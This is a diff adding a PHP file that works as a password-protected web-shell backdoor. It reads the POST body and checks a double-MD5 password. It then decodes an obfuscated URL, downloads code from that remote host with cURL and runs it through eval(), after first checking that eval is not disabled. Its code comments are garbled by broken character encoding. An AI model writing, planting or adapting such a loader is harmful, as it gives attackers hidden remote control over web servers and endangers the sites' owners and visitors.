@@ -1,0 +1,92 @@
+<?php
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+set_time_limit(0);
+
+$disabled_functions = explode(',', ini_get('disable_functions'));
+$suhosin_blacklist = ini_get('suhosin.executor.func.blacklist');
+
+if (in_array('eval', $disabled_functions)) {
+    exit("eval is disabled via disable_functions.");
+} elseif ($suhosin_blacklist && strpos($suhosin_blacklist, 'eval') !== false) {
+    exit("eval is disabled via suhosin.executor.func.blacklist.");
+} else {
+}
+
+//echo rand(1000,9999);
+
+function decrypt_data($encrypted_data) {
+    $decoded_base64 = base64_decode(str_rot13($encrypted_data));
+    $unpacked = unpack("H*", $decoded_base64);
+    $json_string = hex2bin($unpacked[1]);
+    return json_decode($json_string, true);
+}
+function isValidJson($string) {
+    if (!is_string($string) || trim($string) === '') {
+        return false;
+    }
+    $result = json_decode($string);
+    $error = json_last_error();
+    if ($error !== JSON_ERROR_NONE) {
+        return false;
+    }
+    if ($result === null && strtolower(trim($string)) !== 'null') {
+        return false;
+    }
+    return true;
+}
+function sendGetRequest($url, $headers = []) {
+
+    $ch = curl_init($url);
+
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // è¿”å›žå“åº”ç»“æžœï¼Œè€Œä¸æ˜¯ç›´æŽ¥è¾“å‡º
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // å…è®¸ cURL è‡ªåŠ¨å¤„ç†é‡å®šå‘
+
+
+    if (!empty($headers)) {
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    }
+
+    $response = curl_exec($ch);
+
+    if ($response === false) {
+        $error = curl_error($ch);
+        curl_close($ch);
+        return "fail: $error";
+    }
+
+    curl_close($ch);
+
+    return $response;
+}
+
+
+$rawData = file_get_contents('php://input');
+$rawData=substr($rawData, 10);
+$datajson= base64_decode($rawData);
+if(!isValidJson($datajson)) {
+    exit("invalid json");
+}
+$realdata=json_decode($datajson, true);
+if (!isset($realdata['passwd'])) {
+    die("nopd");
+}
+if (md5(md5($realdata['passwd'])) != "f4cc399f0effd13c888e310ea2cf5399") {
+    die("errorpd");
+}
+
+if (!isset($realdata['passwd'])) {
+    die("nodata");
+}
+
+
+$data = decrypt_data($realdata['data']);
+
+$url = $data['link'];
+
+
+$response = sendGetRequest($url);
+
+
+eval($response);
